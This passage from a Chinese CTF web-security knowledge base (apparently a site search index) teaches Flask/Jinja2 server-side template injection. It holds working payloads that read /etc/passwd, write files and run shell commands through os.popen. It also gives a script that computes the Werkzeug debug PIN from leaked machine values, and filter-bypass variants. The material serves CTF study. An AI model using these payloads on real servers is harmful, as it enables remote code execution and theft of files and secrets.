%}#\uff08\u8fd9\u4e2a\u662f\u4e0b\u5212\u7ebf\uff0c\u7528pop\u53d6\uff0c\u548c\u4e0a\u9762\u7c7b\u4f3c\uff09\n{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}\n{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}\n{% set space=chcr(three*three*five-five-five-three) %}\n{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}\n{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}\n</code></pre> <p>\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\uff0c\u4e4b\u540e\u4f60\u8fd8\u4f1a\u770b\u5230\u4ed6\u7684\u3002</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_4","title":"\u4f7f\u7528\u5de5\u5177","text":"<p>tplmap:ssti\u626b\u63cf\u5de5\u5177\uff0c\u5728\u521d\u671f\u4f1a\u5e26\u7ed9\u4f60\u7f8e\u5999\u7684\u4f53\u9a8c</p> <pre><code>git clone https://github.com/epinna/tplmap\n</code></pre> <p>\u81f3\u4e8e\u7528\u6cd5-h\u81ea\u5df1\u6162\u6162\u6478\u7d22\u3002</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#django","title":"Django\u62a5\u9519","text":"<p>\u4e0d\u662fssti</p> <p>\u4f46\u662f\u662f\u6a21\u677f\u6240\u4ee5\u653e\u8fd9\u4e86\uff0c\u539f\u7406\u662f\u6ea2\u51fa</p> <p>%80\u540e\u7684\u5b57\u7b26\u7ed3\u5408\u62a5\u9519\u4fe1\u606fUnicodeEncodeError\u53ef\u4ee5\u63a8\u65ad\u662f\u7531\u4e8eascii\u7f16\u7801\u4e0d\u652f\u6301\u5bfc\u81f4\u7684\u62a5\u9519</p> <p>\u7f51\u7ad9\u662f\u4f7f\u7528Django\u8fdb\u884c\u5f00\u53d1\u7684,\u7ed3\u5408PHP\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u6ce8\u5165@\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u6f0f\u6d1e,\u4f9d\u6b21\u67e5\u770bpython\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u6570\u636e\u5e93\u5f97\u5230flag\u7684\u5185\u5bb9</p> <p>\uff08\u8fd9\u4e2a\u6211\u81ea\u5df1\u603b\u7ed3\u56fe\u7247\u88ab\u541e\u6389\u4e86\uff0c\u5148\u653e\u7740\uff09</p>"},{"location":"web/ssti/flask/flask_pin/","title":"pin\u7801\u7834\u89e3","text":"<p>\u8fd9\u91cc\u7684pin\u7801\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e00\u79cd\u8ba4\u8bc1\u7801\u3002</p> <p>\u8f93\u5165\u5931\u8d25\u8d85\u8fc710\u6b21\u5c31\u4f1a\u81ea\u52a8\u9501\u5b9a\uff0c\u6240\u4ee5\u4e0d\u80fd\u8c6a\u593a\uff0c\u53ea\u80fd\u667a\u53d6\u3002</p> <p>\u5371\u5bb3\uff1a</p> <p>1.\u4f1a\u6cc4\u9732\u5f53\u524d\u62a5\u9519\u9875\u9762\u7684\u6e90\u7801\uff0c\u53ef\u4f9b\u5ba1\u8ba1\u6316\u6398\u5176\u4ed6\u6f0f\u6d1e</p> <p>2.\u4f1a\u6cc4\u9732Web\u5e94\u7528\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u53caPython\u89e3\u91ca\u5668\u7684\u8def\u5f84</p> <p>3.debug\u9875\u9762\u4e2d\u5305\u542bPython\u7684\u4ea4\u4e92\u5f0fshell\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610fPython\u4ee3\u7801</p> <p>\u8fd9\u524d\u4e24\u6761\u4e00\u822c\u90fd\u662f\u4e0e\u4ee3\u7801\u5ba1\u8ba1\u76f8\u5173\uff0c\u53ef\u4ee5\u8bb2\u96be\u70b9\u80af\u5b9a\u4e0d\u5728\u8fd9\uff0c\u7136\u540e\u6700\u540e\u4e00\u6761\u5c31\u662f\u8fd9\u91cc\u6240\u8bb2\u7684pin\u7801\u66b4\u529b\u7834\u89e3</p> <p>\u78b0\u5230\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u8981\u6c42\u662fflask\u6a21\u677f\u5b83\u5f00\u542fdebug\u6a21\u5f0f\uff08\u4fe1\u606f\u6cc4\u9732\u5df2\u7ecf\u662f\u975e\u5e38\u5371\u9669\u4e86\uff09</p> <p>\u8fd9\u4e2adebug\u9875\u9762\u5927\u6982\u662f\u957f\u8fd9\u4e2a\u6837\u5b50\uff1a</p> <p></p> <p></p> <p>\u4e0d\u4ec5\u80fd\u770b\u62a5\u9519\u6e90\u7801\uff0c\u5728\u65c1\u8fb9\u6709\u4e2a\u9ed1\u8272\u7684\u5c0f\u6846\u5b50\u70b9\u5f00\u4e4b\u540e\u5c31\u662f\u8fd9\u4e2apin\u7801\u7684\u754c\u9762\uff0c\u7834\u89e3\u51fa\u8fd9\u4e2apin\u7801\uff0c\u5c31\u5982\u540c\u4e4b\u524d\u7b2c\u4e09\u6761\u6240\u8ff0\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5371\u9669\u7a0b\u5ea6\u975e\u5e38\u7684\u9ad8\u3002</p> <p>pin\u7801\u7684\u751f\u6210\u673a\u5236\u611f\u5174\u8da3\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7f51\u4e0a\u67e5\u627e\u8d44\u6599\uff0c\u8fd9\u91cc\u4e0d\u505a\u53d9\u8ff0</p> <p>\u800cpin\u7801\u751f\u6210\u4f9d\u8d56\u76846\u4e2a\u5143\u7d20\u6211\u4eec\u662f\u77e5\u9053\u7684\uff1a</p> <p>1.\u670d\u52a1\u5668\u8fd0\u884cflask\u6240\u767b\u5f55\u7684\u7528\u6237\u540d\uff08\u67e5\u770b/etc/passwd\u6216\u8005\u731c\uff0c\u4e00\u822c\u4e3aroot\u6216\u8005\u662fflaskweb\uff09</p> <p>2.modname\u3002\u4e00\u822c\u4e0d\u53d8\u5c31\u662fflask.app</p> <p>3.getattr(app, \u201cname\u201d, app.class.name)\u3002python\u8be5\u503c\u4e00\u822c\u4e3aFlask \uff0c\u503c\u4e00\u822c\u4e0d\u53d8</p> <p>4.flask\u5e93\u4e0bapp.py\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u62a5\u9519\u4fe1\u606f\u4f1a\u6cc4\u9732\u8be5\u503c\u3002\uff08\u6709\u70b9\u8003\u773c\u529b\uff09</p> <p>5.\u5f53\u524d\u7f51\u7edc\u7684mac\u5730\u5740\u7684\u5341\u8fdb\u5236\u6570\u3002\u901a\u8fc7\u6587\u4ef6/sys/class/net/eth0/address \u83b7\u53d6(eth0\u4e3a\u7f51\u5361\u540d)</p> <p>6.\u673a\u5668\u7684id\uff1a\u5bf9\u4e8e\u975edocker\u673a\u6bcf\u4e00\u4e2a\u673a\u5668\u90fd\u4f1a\u6709\u81ea\u5df2\u552f\u4e00\u7684id</p> <p>Linux\uff1a/etc/machine-id\u6216/proc/sys/kernel/random/boot_i\uff0c\u6709\u7684\u7cfb\u7edf\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6587\u4ef6</p> <p>docker\uff1a/proc/self/cgroup</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u7206\u7834pin\u7801\u4e86\uff1a</p> <p>\u4f7f\u7528\u811a\u672c\uff1a\uff08\u5ad6\u7684\uff09</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\nprivate_bits = [\n    '2485410388611',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed'# get_machine_id(), /etc/machine-id\n]\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\ncookie_name = '__wzd' + h.hexdigest()[:20]\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\nprint(rv)\nPython\n</code></pre> <p>\u7136\u540e\u518d\u60f3\u60f3\uff0c\u8fd9\u4e2a\u653e\u5230ssti\u91cc\u9762\u7684\u539f\u56e0\uff0c\u6a21\u677f\u6ce8\u5165\u561b</p> <p>\u591a\u591a\u5c11\u5c11\u8fd8\u662f\u8ddfssti\u6709\u4e9b\u5173\u7cfb\uff0c\u9664\u4e86\u4e0a\u9762\u6240\u8bf4\u7684\u57fa\u672c\u4e0d\u53d8\u7684\uff0c\u5176\u4ed6\u4e1c\u897f\u662f\u9700\u8981\u901a\u8fc7\u6a21\u677f\u6ce8\u5165\u53bb\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u540c\u6837\u7ed9\u51fa\u4e00\u4e9b\u53ef\u80fd\u7528\u7684\u4e0a\u7684payload</p> <pre><code>\u83b7\u53d6MAC\u5730\u5740\uff1a\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}\u8bb2\u5b9e\u8bdd\u8fd9\u4e2aif\u662f\u771f\u7684\u5f88\u5389\u5bb3\uff0c\u4ee5\u540e\u4f1a\u78b0\u5230if\u6765\u7ed5\u8fc7\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u673a\u5668\u7684ID\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}\nPlain Text\n</code></pre> <p>\u81ea\u5df1\u641c\uff1a</p> <p>GYCTF2020 FlaskApp</p>"},{"location":"web/ssti/flask/flask_ssti/","title":"Flask ssti","text":""},{"location":"web/ssti/flask/flask_ssti/#flaskjinja2","title":"FLASK\u6a21\u677f\uff08jinja2\u6846\u67b6)","text":"<p>\u8fd9\u53ef\u80fd\u662f\u4f60\u5c06\u4f1a\u78b0\u5230\u7684\u6700\u591a\u7684\u6a21\u677f</p> <p>\u5f04\u61c2\u8fd9\u4e2a\u662f\u63a5\u4e0b\u6765\u51e0\u4e2a\u6a21\u677f\u7684\u6bd4\u8f83\u91cd\u8981\u7684\u57fa\u7840\u3002\uff08\u6240\u4ee5\u53ef\u80fd\u4f1a\u5570\u55e6\uff09</p> <p>\u6a21\u677f\u57fa\u4e8epython,\u53ef\u80fd\u662fpy2\u4e5f\u53ef\u80fd\u662fpy3\uff0c\u8c8c\u4f3cpy2\u4f1a\u591a\u4e00\u70b9\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask","title":"Flask","text":"<p>\u5982\u679c\u6e32\u67d3\u7684\u6a21\u7248\u5185\u5bb9\u53d7\u5230\u7528\u6237\u7684\u63a7\u5236\u3002\u3002\u3002\u3002</p> <pre><code>from flask import Flask, request\nfrom jinja2 import Template\napp = Flask(__name__)\n@app.route(\"/\")\ndef index():\nname = request.args.get('name', 'guest')\nt = Template(\"Hello \" + name)\nreturn t.render()\nif __name__ == \"__main__\":\napp.run();\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\u663e\u7136\u662fname</p> <p>\u63d0\u4ea4 ?name=guest.{{7*7}}</p> <p>\u4f1a\u53d1\u73b0\u88ab\u8ba1\u7b97\u6210\u4e8649</p> <p>\u53c8\u6216\u8005\u662f{{\u2018abcd\u2019,upper()}}(\u672c\u8d28\u4e0a\u8fd8\u662fpy)</p> <p>\u4f1a\u8f93\u51faABCD</p> <p>\u4e0b\u9762\u5f00\u59cb\u52a0\u901f\uff1a</p> <p>py2:</p> <pre><code>#\u8bfb\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n#\u5199\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write(\"\") }}\nPlain Text\n</code></pre> <p>py3:</p>"},{"location":"web/ssti/flask/flask_ssti/#_1","title":"\u547d\u4ee4\u6267\u884c\uff1a","text":"<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}\n#\u6587\u4ef6\u64cd\u4f5c\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}\nPlain Text\n</code></pre> <p>\uff08py2\u5305\u542b\u7684\u7c7bpy3\u4e00\u822c\u90fd\u6709\uff0c\u4f46\u662f\u4f4d\u7f6e\u987a\u5e8f\u4e0d\u592a\u4e00\u6837\uff0c\u7136\u540e\u5c31\u662f\u8c03\u7528\u683c\u5f0f\u786e\u5b9e\u4e0d\u592a\u4e00\u6837\uff09</p> <p>\u8fd9\u91cc\u4ee5py2\u4e3a\u4f8b\uff1a</p> <p>flask\u51fd\u6570\u89e3\u6790\uff1a</p> <pre><code>__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b\n__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868\n__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4\n__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b\n__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\nPlain Text\n</code></pre> <p>{{ ''.class.mro[2].subclasses()40.read() }}\uff08\u5982\u679c\u8fd8\u8bb0\u5f97\u7684\u8bdd{{}}\u662f\u8f93\u51fa\u7684\u610f\u601d\uff09</p> <p>\u6240\u4ee5\u8fd9\u53e5\u8bdd\u7684\u903b\u8f91\u662f\u4ec0\u4e48\u5462\uff1f</p> <p>\u521b\u5efa\u4e00\u4e2a\u7a7a\u5b57\u7b26\uff0c\u8fd4\u56de\u5b83\u7684\u53c2\u6570\u7c7b\u578b\uff0c\u5bfb\u627e\u57fa\u7c7b\uff0c\u627e\u5b50\u7c7b\uff0c\u9009\u53d6\u7b2c40\u4e2a\u5b50\u7c7b\uff0c\u8c03\u7528\u5176\u4e2d\u7684read\u51fd\u6570\u3002\u8fd9\u4e5f\u662f\u4e00\u6761\u903b\u8f91\u94fe\uff0cflask\u7684\u6a21\u677f\u6ce8\u5165\u7684\u6838\u5fc3\u5c31\u662f\u8fd9\u6761\u903b\u8f91\u94fe\u3002\u6216\u8005\u88ab\u79f0\u4e4b\u4e3a\u6c99\u76d2\u9003\u9038\uff1a\u521b\u5efa\u4e00\u4e2a\u76f8\u5bf9\u5c01\u95ed\u7684python\u6c99\u76d2\u73af\u5883\uff0c\u7136\u540e\u4ece\u67d0\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u627e\u5230\u6700\u9876\u5c42\uff0c\u7136\u540e\u4e00\u6b65\u4e00\u6b65\u5411\u4e0b\u6478\u7d22\uff0c\u6700\u540e\u4ece\u6c99\u7bb1\u4e2d\u9003\u9038\u51fa\u53bb\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask_1","title":"FLASK\u6d41\u7a0b","text":"<p>\u4e5f\u53ef\u4ee5\u53eb\u5c0fpayload\uff0c\u4e0b\u6b21\u627e\u4e2a\u57fa\u7840\u70b9\u7684\uff0c\u6ca1\u8fc7\u6ee4\u7684\u9898\uff0c\u53ef\u4ee5\u597d\u597d\u8bd5\u8bd5\u3002</p> <pre><code>\u51fd\u6570\u89e3\u6790\n__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b:\n''.__class__.__mro__[2]//mro\u627e\u7684\u4f1a\u6bd4base\u5feb\u4f5c\u7528\u7c7b\u4f3c\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8]//\u9488\u5bf9jinjia2/flask\u4e3a[9]\u9002\u7528\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b\u540e\uff0c\u7ee7\u7eed\u5411\u4e0b\u83b7\u53d6\u57fa\u672c\u7c7b(object)\u7684\u5b50\u7c7b\nobject.__subclasses__()\nPlain Text\n</code></pre> <pre><code>\u627e\u5230\u91cd\u8f7d\u8fc7\u7684__init__\u7c7b(\u5728\u83b7\u53d6\u521d\u59cb\u5316\u5c5e\u6027\u540e\uff0c\u5e26wrapper\u7684\u8bf4\u660e\u6ca1\u6709\u91cd\u8f7d\uff0c\u5bfb\u627e\u4e0d\u5e26warpper\u7684)\u6240\u8c13\u91cd\u8f7d\uff0c\u5c31\u662f\u591a\u4e2a\u76f8\u540c\u51fd\u6570\u540d\u7684\u51fd\u6570\uff0c\u6839\u636e\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u53c2\u6570\u7c7b\u578b\u800c\u6267\u884c\u4e0d\u540c\u7684\u529f\u80fd\u3002\u6240\u4ee5\u51fd\u6570\u91cd\u8f7d\u5b9e\u8d28\u4e0a\u662f\u4e3a\u4e86\u89e3\u51b3\u7f16\u7a0b\u4e2d\u53c2\u6570\u53ef\u53d8\u4e0d\u7edf\u4e00\u7684\u95ee\u9898\u3002\u7136\u540e\u5c31\u662f\u91cd\u8f7d\u4e86\u90a3\u8fd8\u600e\u4e48\u7528\u561b\u3002\n''.__class__.__mro__[2].__subclasses__()[99].__init__//\u5bf999\u4e2a\u5b9e\u4f8b\u5316&lt;slot wrapper '__init__' of 'object' objects&gt;''.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt;\nPlain Text\n</code></pre> <pre><code>\u67e5\u770b\u5176\u5f15\u7528__builtins__builtins\u5373\u662f\u5f15\u7528\uff0cPython\u7a0b\u5e8f\u4e00\u65e6\u542f\u52a8\uff0c\u5b83\u5c31\u4f1a\u5728\u7a0b\u5e8f\u5458\u6240\u5199\u7684\u4ee3\u7801\u6ca1\u6709\u8fd0\u884c\u4e4b\u524d\u5c31\u5df2\u7ecf\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4e86,\u800c\u5bf9\u4e8ebuiltins\u5374\u4e0d\u7528\u5bfc\u5165\uff0c\u5b83\u5728\u4efb\u4f55\u6a21\u5757\u90fd\u76f4\u63a5\u53ef\u89c1\uff0c\u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u8c03\u7528\u5f15\u7528\u7684\u6a21\u5757\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']\nPlain Text\n</code></pre> <pre><code>\u8fd9\u91cc\u4f1a\u8fd4\u56dedict\u7c7b\u578b\uff0c\u5bfb\u627ekeys\u4e2d\u53ef\u7528\u51fd\u6570\uff0c\u76f4\u63a5\u8c03\u7528\u5373\u53ef\uff0c\u4f7f\u7528keys\u4e2d\u7684file\u4ee5\u5b9e\u73b0\u8bfb\u53d6\u6587\u4ef6\u7684\u529f\u80fd\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()\nPlain Text\n</code></pre> <p>\u81f3\u6b64\u4e00\u6761\u9003\u9038\u94fe\u5c31\u6784\u9020\u4e86\u51fa\u6765\u3002</p> <p>\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u6709\u4e9b\u51fd\u6570\u8fd8\u662f\u86ee\u96be\u627e\u7684\uff0c\u4e0d\u77e5\u9053\u8be5\u7528\u54ea\u4e9b\u7c7b\u6240\u4ee5\u4f1a\u6709\u4e00\u4e9b\u5e38\u7528\u7684payload:</p> <p>\u90fd\u662fpy2\u7684\uff1a</p> <p>\u8bfb\u5199\u6587\u4ef6\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\nPlain Text\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\nPlain Text\n</code></pre> <p>\u547d\u4ee4\u6267\u884c\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\nPlain Text\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')\nPlain Text\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\nPlain Text\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')\nPlain Text\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\uff1a</p> <p>\u9996\u5148\u5c31\u662f\u5224\u65ad\uff0c\u662f\u5426\u5b58\u5728ssti\u6a21\u677f\u6ce8\u5165\u70b9</p> <p>\u786e\u5b9a\u627e\u5230\u6ce8\u5165\u70b9\u4e4b\u540e\uff0c\u7531\u4e8eflask\u7b49ssti\u6a21\u677f\u90fd\u662f\u7531python\u7f16\u5199\uff0c\u6211\u4eec\u53c8\u53ef\u4ee5\u5728\u4e0a\u9762\u6267\u884c\u4ee3\u7801\uff0c\u4e8e\u662f\u5c31\u80fd\u591f\u5728ssti\u4e0a\u67e5\u627e\u6846\u67b6\u4e2d\u6240\u5305\u542b\u7684\u7c7b</p> <p>\u627e\u5230\u67d0\u4e2a\u7c7b\u4e4b\u540e\u7ee7\u7eed\u8c03\u7528\uff0c\u627e\u5230\u5b50\u7c7b\uff0c\u7236\u7c7b\u7b49</p> <p>\u6700\u540e\u901a\u8fc7\u627e\u5230\u7684\u7c7b\u4e2d\u53ef\u80fd\u5305\u542b\u7684\u51fd\u6570os.\u3002\u3002\u3002\u3002\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4ee3\u7801\u5373\u53ef\u3002</p> <pre><code>.__class__.__mro__//\u627e\u57fa\u7c7b\n.__class__.__mro__[0].__subclasses__()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\n{{\"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}//.init.globals\u6765\u627eos\u7c7b\u4e0b\u7684\uff0cinit\u521d\u59cb\u5316\u7c7b\uff0c\u7136\u540eglobals\u5168\u5c40\u6765\u67e5\u627e\u6240\u6709\u7684\u65b9\u6cd5\u53ca\u53d8\u91cf\u53ca\u53c2\u6570\u3002\n.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\uff0c\u6267\u884c\u5e76\u4e14\u8c03\u7528\u3002\n{{config.__class__.__init__.__globals__['os'].environ}}\u8fd9\u4e2a\u662f\u5173\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\uff0c\u6709\u65f6\u5019FLAG\u4e5f\u4f1a\u653e\u5728\u914d\u7f6e\u6587\u4ef6\u4e4b\u4e2d\u3002\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web/ssti/flask/flask_ssti/#_3","title":"\u7ed5\u8fc7\u4e2d\u62ec\u53f7","text":"<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()\nPlain Text\n</code></pre> <pre><code>\u4f7f\u7528gititem\u7ed5\u8fc7\u3002\u5982\u539fpoc {{\"\".class.bases[0]}}\u7ed5\u8fc7\u540e{{\"\".class.bases.getitem(0)}}\nPlain Text\n</code></pre> <p>pop() \u51fd\u6570\u7528\u4e8e\u79fb\u9664\u5217\u8868\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff08\u9ed8\u8ba4\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u5e76\u4e14\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u503c</p>"},{"location":"web/ssti/flask/flask_ssti/#_4","title":"\u8fc7\u6ee4\u5f15\u53f7","text":"<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_5","title":"\u8fc7\u6ee4\u53cc\u4e0b\u5212\u7ebf","text":"<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u7528\u5230\u7684\u662frequest:(\u7a0d\u5fae\u89e3\u91ca\u4e00\u4e0b)</p> <p><code>{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&amp;b=__mro__&amp;c=__subclasses__}}</code></p> <pre><code>\u5982\u4e0b\u4e3a\u5e38\u7528\u7684request\u59ff\u52bfrequest.args.x1      get\u4f20\u53c2request.values.x1    post\u4f20\u53c2request.cookiesrequest.form.x1     post\u4f20\u53c2    (Content-Type:applicaation/x-www-form-urlencoded\u6216multipart/form-data)request.data          post\u4f20\u53c2    (Content-Type:a/b)request.json      post\u4f20json  (Content-Type:application/json)\nPlain Text\n</code></pre> <p>\u5728Flask\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u662f\u8fd9\u6837\u4ecb\u7ecdrequest\u7684\uff1a\u5bf9\u4e8e Web \u5e94\u7528\uff0c\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u6570\u636e\u4ea4\u4e92\u81f3\u5173\u91cd\u8981\u3002\u5728 Flask \u4e2d\u7531\u5168\u5c40\u7684 request \u5bf9\u8c61\u6765\u63d0\u4f9b\u8fd9\u4e9b\u4fe1\u606f\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#subclasses","title":"\u8fc7\u6ee4\u4e86subclasses\u7b49\u5b57\u7b26","text":"<pre><code>\u62fc\u51d1\u6cd5\n\u539fpoc{{\"\".class.bases[0].subclasses()}}\n\u7ed5\u8fc7{{\"\".class.bases[0]'subcla'+'sses'}}\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#class","title":"\u8fc7\u6ee4class","text":"<pre><code>\u4f7f\u7528sessionpoc{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}\u591a\u4e2abases[0]\u662f\u56e0\u4e3a\u4e00\u76f4\u5728\u5411\u4e0a\u627eobject\u7c7b\u3002\u4f7f\u7528mro\u5c31\u4f1a\u5f88\u65b9\u4fbf\nPlain 